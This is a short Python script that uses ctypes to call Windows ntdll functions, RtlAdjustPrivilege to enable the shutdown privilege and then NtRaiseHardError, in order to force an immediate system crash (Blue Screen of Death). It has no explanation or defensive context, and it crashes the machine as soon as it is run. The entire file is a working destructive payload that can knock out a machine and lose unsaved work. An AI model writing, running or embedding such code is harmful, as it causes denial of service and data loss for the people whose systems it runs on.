
import ctypes

def trigger_bsod():
    # Define a function that triggers a system crash (Blue Screen of Death)
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))

if __name__ == "__main__":
    trigger_bsod()
